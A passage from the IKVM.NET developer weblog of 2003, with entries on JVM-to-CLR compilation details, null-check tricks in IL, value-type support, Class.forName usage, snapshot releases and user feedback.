        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>((Foo)<span style="COLOR: blue">null</span>).<span style="COLOR: blue">new </span>Inner();<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span>
    </div>
    <p>
    </p>
    <p>
        Why does this throw a NullPointerException? The answer may be surprising, but it is
        because Javac inserts a call to <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">((Foo)null).getClass()</span> to
        make it throw a NullPointerException if the outer this is null. If it didn't do this,
        you'd run into a NullPointerException later on when one of Inner's methods tried to
        use the outer this and this would be a very surprising and hard to find bug. However,
        I didn't want to use this trick because it isn't particularly efficient. What I came
        up with is the following trick: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldvirtftn
        instance string System.Object::ToString()<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">pop<br />
        </span>
    </div>
    <p>
    </p>
    <p>
        The JIT compiles this to: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">mov<span style="mso-spacerun: yes">&#160;&#160; </span>eax,dword
        ptr [ecx] 
        <br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">mov<span style="mso-spacerun: yes">&#160;&#160; </span>eax,dword
        ptr [eax+28h] 
        <br />
        </span>
    </div>
    <p>
    </p>
    <p>
        If the reference in question is null, the first instruction causes an x86 trap that
        the CLR translates into a NullReferenceException. The second instruction is overhead
        and hopefully a future version of the JIT will stop emitting it, but it isn't very
        expensive anyway. 
    </p>
    <p>
    </p>
    <p>
        Note to self: Consider adding an optimization to the IKVM compiler to detect Javac's
        null reference check: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">invokevirtual
        java/lang/Object.getClass()</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"></span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">pop</span> 
        <br />
    </div>
    <p>
    </p>
    <p>
        and replace it with the more efficient <i>ldvirtftn</i> based check above. This could
        actually be an important optimization, because getClass() on IKVM is pretty expensive. 
    </p>
    <p>
    </p>
    <p>
        [1] When the base classes are in the same module, the C# actually emits a call to
        the class the defines the method, instead of to the direct base class. This is an
        optimization, because it saves the JIT from having to search for the method in the
        class hierarchy. When all classes are in the same module, there obviously aren't any
        versioning issues, since the module is always built as one unit. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/02/2003 17:56:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=99fcff6c-8ab7-4358-9467-ddf71dd20acd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=99fcff6c-8ab7-4358-9467-ddf71dd20acd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 30 May 2003</h2></div>
<div class="newsItems"><a name="abf91ff6e-bfcf-4a0b-9b98-592112e8e83b"></a><div class="entry">
	<h3 class="entryTitle">Update</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        After a long hiatus, finally another update. Many changes, mostly clean up. I moved
        some of the custom attributes to a new assembly OpenSystem.Java.dll. Hopefully this
        will be useful for the dotGNU Java compiler.
    </p>
    <p>
        I made new <a href="http://www.frijters.net/ikvm.zip">source</a>&#160;and <a href="http://www.frijters.net/ikvmbin.zip">binaries</a> snapshots
        available, these are based on the current GNU Classpath cvs code + one <a href="http://www.frijters.net/DatagramSocket.patch">patch</a>.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2003 14:17:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bf91ff6e-bfcf-4a0b-9b98-592112e8e83b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bf91ff6e-bfcf-4a0b-9b98-592112e8e83b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="adc04f207-4758-46ee-9f2a-17d36b8b72b7"></a><div class="entry">
	<h3 class="entryTitle">Redmond</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    Like <a href="http://www.ingorammer.com/weblog/archives/001288.html">Ingo</a>, I'll
    be in Redmond on the 25th and 26th of June. Anyone else?</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2003 08:51:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=dc04f207-4758-46ee-9f2a-17d36b8b72b7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=dc04f207-4758-46ee-9f2a-17d36b8b72b7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 10 May 2003</h2></div>
<div class="newsItems"><a name="a894943be-451e-4d6c-a692-77119eb02d06"></a><div class="entry">
	<h3 class="entryTitle">Eclipse on Mono</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Zoltan Varga just posted the following to the ikvm-developers list: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            Hi, 
        </p>
        <p>
            I got Eclipse running under IKVM under Mono. A screenshot, Makefiles etc. can be found
            here: 
        </p>
        <p>
        </p>
        <a href="http://www.nexus.hu/vargaz/">http://www.nexus.hu/vargaz/ </a> 
        <p>
            The port uses a JNI provider written in C which works with mono. Eclipse startup up+shuts
            down in about 1 minute on an 1Ghz PC, while consuming about 90MB of memory. It works
            with Mono 0.24 and current mono CVS. 
        </p>
        <p>
            I made some modifications to IKVM which are in the attached patch. 
        </p>
        <p>
            Could they be applied to the official version? 
        </p>
        <p>
            The modifications are: 
        </p>
        <p>
            - ikvm.build: fix case of directory names 
        </p>
        <p>
            - ClassLoaderWrapper.cs: Create Assemblies with Run flag, so the 
        </p>
        <p>
            runtime can apply some memory saving optimizations. 
        </p>
        <p>
            - TypeWrapper.cs: Cache field lookups 
        </p>
        <p>
            - classpath.cs: Make shared library loading work under UNIX 
        </p>
        <p>
            There is one other issue: Mono does not yet support the 
        </p>
        <p>
            GetLoadedModules() method, so this has to be commmented out in classpath.cs and in
            Handler.java. 
        </p>
        <p>
            BTW: The IBM RVM project includes a nice JNI testsuite: 
        </p>
        <p>
        </p>
        <a href="http://www-124.ibm.com/developerworks/oss/jikesrvm/">http://www-124.ibm.com/developerworks/oss/jikesrvm/ </a> 
        <p>
            The Mauve test status of mono: 
        </p>
        <p>
            191 of 7294 tests failed 
        </p>
        <p>
            Would it be possible to post the Mauve test results of IKVM somewhere (with -verbose)
            so I can compare it to the Mono version? 
        </p>
        <p>
            have fun 
        </p>
        <p>
            Zoltan 
        </p>
    </div>
    <p>
    </p>
    <p>
        Wow! This is great news.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/10/2003 13:33:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=894943be-451e-4d6c-a692-77119eb02d06"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=894943be-451e-4d6c-a692-77119eb02d06">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 09 May 2003</h2></div>
<div class="newsItems"><a name="ab9bcdbe6-965c-4323-9255-801f1a4c603f"></a><div class="entry">
	<h3 class="entryTitle">Class.forName()</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Stuart <a href="http://weblog.ikvm.net/commentview.aspx/44664fcc-827b-43e2-9f89-859a75a5e516">asks</a>: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">Can
        IKVMC handle Class.forName if the target class is in an assembly that isn't directly
        referenced by the assembly making the call? 
    </div>
    <p>
    </p>
    <p>
        Yes, but then you have to specify the assembly qualified name of the class. For example: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Class.forName("System.Windows.Forms.Form,
        " +</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">&#160;</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160;</span>"System.Windows.Forms,
        " + </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>"Version=1.0.3300.0,
        " + </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>"Culture=neutral,
        " + </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>"PublicKeyToken=b77a5c561934e089"); </span>
    </div>
    <p>
    </p>
    <p>
    </p>
    <p>
        Another alternative, when the class hasn't been compiled to an assembly,&#160;is to
        instantiate a class loader and use that to load the class: 
    </p>
    <p>
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">URL[]
        classpath = <span style="COLOR: blue">new</span> URL[1]; </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">classpath[0] = <span style="COLOR: blue">new</span> URL("..."); </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ClassLoader loader = <span style="COLOR: blue">new</span> URLClassLoader(classpath); </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Class clazz = loader.loadClass("...");</span> 
    </div>
    <p>
    </p>
    <p>
    </p>
    <p>
        Currently, when <em>ikvm.exe </em>isn't used to start your application you don't have
        an application&#160;class loader that loads classes from the directories specified
        in the <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">CLASSPATH</span> environment
        variable. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2003 11:16:56 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b9bcdbe6-965c-4323-9255-801f1a4c603f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b9bcdbe6-965c-4323-9255-801f1a4c603f">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 28 April 2003</h2></div>
<div class="newsItems"><a name="a44664fcc-827b-43e2-9f89-859a75a5e516"></a><div class="entry">
	<h3 class="entryTitle">DotGNU & New Snapshot</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Saturday I joined the&#160;<a href="http://www.gnu.org/projects/dotgnu/">DotGNU</a>&#160;IRC
        meeting to discuss their Java support. We decided to make sure that our efforts will
        be interoperable.<br />
        They are working on a Java source to IL compiler and this complements IKVM's byte
        code to IL compiler nicely. We'll be working together to create a standard format
        for remapping Java classes to .NET classes and define custom attributes to express
        Java semantics that don't map directly onto the .NET standard attributes. 
    </p>
    <p>
        I made new <a href="http://www.frijters.net/ikvm.zip">source</a>&#160;and <a href="http://www.frijters.net/ikvmbin.zip">binaries</a> snapshots
        available. Not many changes: 
    </p>
    <ul>
        <li>
            <em>invokespecial</em> byte code now checks for null references before calling the
            method. I intend to write an item on <em>invokespecial </em>in the future, because
            it is quite an interesting instruction with a bit of a history. 
        </li>
        <li>
            Improved method overriding handling for methods that are less accessible than the
            method they override. Java allows this, but .NET doesn't. It is handled by&#160;giving
            the overriding method the same (or better) accessibility as the overriden method.<br />
            IMHO this is a&#160;<strong>design flaw</strong> in the CLR, because it makes it a
            breaking change to widen the access of a virtual method in a new version of a type. 
        </li>
        <li>
            Improved <em>ikvmc</em>'s handling of -recurse and added wildcard support to file
            arguments. 
        </li>
    </ul>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/28/2003 10:54:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=44664fcc-827b-43e2-9f89-859a75a5e516"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=44664fcc-827b-43e2-9f89-859a75a5e516">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 April 2003</h2></div>
<div class="newsItems"><a name="ae9b34df7-3efd-4675-a5fa-82167a41696a"></a><div class="entry">
	<h3 class="entryTitle">Feedback</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    Stuart posted a nice comment: 
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">Well,
        I now am a legitimate happy IKVM user.<br />
        <br />
        I just found myself in a situation where I wanted to be able to call nrdo code (nrdo
        is a Java tool for database access, http://nrdo.sab39.org/) from a web application,
        that also had to read its input files from a windows machine. The individual parts
        of that aren't a problem: nrdo is reasonably well librarified so it's perfectly possible
        to call it from a web application, and it's perfectly possible to run Java code on
        windows (indeed, that's how our normal development is done).<br />
        <br />
        But we don't have any windows machines running any Java application servers, and spawning
        a Java process from inside ASP.NET didn't appeal very much :)<br />
        <br />
        It's funny how I've been following IKVM for a while but it still took ages before
        the obvious solution hit me. I compiled a nrdo.dll (okay, this took me longer than
        I thought because the -recurse option to ikvmc didn't do what I thought it would and
        neither did path\*.class), created an ASP.NET web application in Visual Studio, added
        references to classpath.dll, nrdo.dll and ik.vm.net.dll, and started typing.<br />
        <br />
        It was a seriously schizophrenic experience (but in a good way!). I don't normally
        use an IDE for Java coding so it was the first time I'd ever seen intellisense for
        my nrdo libraries. And you can get seriously confused as to which language you're
        using when you write C# code that looks like this:<br />
        <br />
        using java.util;<br />
        <br />
        for (Iterator i = myList.iterator(); i.hasNext(); ) {<br />
        MyThing foo = (MyThing) i.next();<br />
        foo.something();<br />
        }<br />
        <br />
        But it worked, and it took me about an hour to solve what I'd expected to be a pretty
        complex problem. The schizophrenic aspect is just an artefact of IKVM being really,
        *really* good at its job! 
    </div>
    <br />
    <p>
        Thanks! Patches to make <em>ikvmc</em> more intuitive are always welcome of course
        ;-) 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/25/2003 08:53:56 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e9b34df7-3efd-4675-a5fa-82167a41696a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e9b34df7-3efd-4675-a5fa-82167a41696a">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 April 2003</h2></div>
<div class="newsItems"><a name="ab5276df7-e90f-4e74-a330-a93e94b2ee18"></a><div class="entry">
	<h3 class="entryTitle">Snapshot</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I checked in my value type changes, along with a bunch of other changes and made new
        snapshots.
    </p>
    <p>
        Here are the highlights:
    </p>
    <ul>
        <li>
            (limited) support for using value types</li>
        <li>
            support for calling methods with ByRef arguments</li>
        <li>
            better support in map.xml for redirecting to Java classes</li>
        <li>
            moved parts of StringHelper &amp; ObjectHelper from C# to Java</li>
        <li>
            updated to be compatible with current Classpath cvs</li>
    </ul>
    <p>
        <a href="http://www.frijters.net/ikvm.zip">Source </a>and <a href="http://www.frijters.net/ikvmbin.zip">binaries</a> snapshots
        are in the usual locations.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/14/2003 12:32:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b5276df7-e90f-4e74-a330-a93e94b2ee18"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b5276df7-e90f-4e74-a330-a93e94b2ee18">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 11 April 2003</h2></div>
<div class="newsItems"><a name="aa8757d54-d0be-4e32-8dc3-b7f0c0ce13eb"></a><div class="entry">
	<h3 class="entryTitle">More value type feedback</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Stuart Ballard commented on yesterday's <a href="http://weblog.ikvm.net/PermaLink.aspx/b0595fde-1ef6-4e90-8b8e-e71fa19482c7">entry</a>: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">I
        definitely think these changes should be included.<br />
        <br />
        As I understand it, without them it is impossible to use C# structs, enums and other
        value types in Java code at all, and also impossible to call methods which require
        ref or out parameters. 
    </div>
    <br />
    <p>
        This is correct (except that enums were already&#160;usable from Java, they are visible
        as classes containing public static final int fields and arguments are just int arguments). 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">To
        me this scenario is very disappointing - the dream of IKVM, for me, was to see Java
        as a first-class .NET language while still remaining "true java". Eliminating support
        for value types and reference arguments clashes with the first of these goals; requiring
        a hacked compiler violates the second.<br />
        <br />
        I'd even go so far as to ask whether it would be possible to actually *write* a "struct"
        in java, along the lines of the following:<br />
        <br />
        public class JavaStruct extends system.ValueType {<br />
        int structMember;<br />
        }<br />
        <br />
        Presumably it would be possible for ikvm to detect classes that inherit from ValueType
        and compile them as structs rather than classes... 
    </div>
    <br />
    <p>
        I briefly considered it, but dismissed it at the time because I didn't need it. You've
        convinced me to take another look at this. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">To
        summarize, not only do I think this is cool functionality (even if the implementation
        *is* a little bit of a hack) I think it's extremely important functionality and I'd
        like to see further fine-tuning of the "hack" and further enhancements to the functionality,
        rather than leaving it out entirely.<br />
        <br />
        The reason I didn't comment earlier, though, is that I don't really have any right
        to comment, as I don't actually use IKVM at all (although I may in the future to save
        my co-developers from downloading the JRE to run a single java program). I'm only
        commenting now to provide at least some positive feedback on the idea of checking
        it in, so that you don't throw it out on the basis that nobody thinks it's valuable
        (although of course I fully respect your right to throw it out for any other reason). 
    </div>
    <br />
    <p>
        Thanks for commenting, I really appreciate it! I will go ahead and polish up the changes
        and check them in. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/11/2003 13:16:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a8757d54-d0be-4e32-8dc3-b7f0c0ce13eb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a8757d54-d0be-4e32-8dc3-b7f0c0ce13eb">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 10 April 2003</h2></div>
<div class="newsItems"><a name="ab0595fde-1ef6-4e90-8b8e-e71fa19482c7"></a><div class="entry">
	<h3 class="entryTitle">More on value types</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        David Jeske commented on the&#160;previous <a href="http://weblog.ikvm.net/PermaLink.aspx/82cb6a14-41a9-4b05-b215-812202b71366">entry</a>:&#160; 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0"><span class="commentBody">Can
        ValueType local variables be treated as ValueTypes instead of pointers to ValueTypes?
        If this were the case, then av[1] could be the pointer to the interior of the valuetype
        array, and av[1].foo = 42; would work correctly. This would also make the IL for using
        local ValueType variables most similar to how it would turn out if it had been C#.<br />
        <br />
        The boxing/unboxing would only occur when coercing/converting from a local variable
        of a ValueType to a ReferenceType (i.e. Object foo = v; )</span> 
    </div>
    <p>
    </p>
    <p>
        <span class="commentBody">Remember that I'm working with a standard Java compiler.
        All the value type support is in the byte code to CIL compiler, because of this I
        wanted to stay as close to the Java semantics as possible, to prevent problems caused
        by Java compiler differences (there really isn't any guarantee that local variables
        in the source end up as local variables in the byte code). Also, the current&#160;design
        a lot easier to implement ;-)</span>
    </p>
    <p>
        <span class="commentBody">Having said that, treating locals as value types still wouldn't
        allow av[1].foo = 42;</span> to work. This would require the <em>aaload</em> instruction
        to return a pointer to the array element, in itself this isn't hard but the introduction
        of pointers would complicate the type system greatly.
    </p>
    <p>
        Ultimately, the reason I added this&#160;(limited)&#160;value type support, is to
        enable me to write more "native" Java methods in Java. I haven't checked in these
        changes and I'm still not sure that doing so would be a good idea. Without Java compiler
        support it will always be a hack.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/10/2003 12:26:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b0595fde-1ef6-4e90-8b8e-e71fa19482c7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b0595fde-1ef6-4e90-8b8e-e71fa19482c7">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 05 April 2003</h2></div>
<div class="newsItems"><a name="a82cb6a14-41a9-4b05-b215-812202b71366"></a><div class="entry">
	<h3 class="entryTitle">Value Types & Reference Arguments</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I've added experimental support for using value types and reference arguments&#160;in
        Java. The challenge is to do this&#160;without&#160;having to build a new Java compiler. 
    </p>
    <p>
        Here is a value type I constructed in C# for testing purposes: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <span style="COLOR: blue">struct</span> ValType
            {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public</span> <span style="COLOR: blue">int</span> foo;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public</span> ValType(<span style="COLOR: blue">int</span> f)
            {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>foo
            = f;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public</span> <span style="COLOR: blue">override</span> <span style="COLOR: blue">string</span> ToString()
            {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span><span style="COLOR: blue">return</span> "ValType:"
            + foo;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public</span> <span style="COLOR: blue">static</span> <span style="COLOR: blue">void</span> Increment(<span style="COLOR: blue">ref</span> ValType
            v) {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>v.foo++;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<O:P></O:P>
            &#160;</span> 
        </p>
    </div>
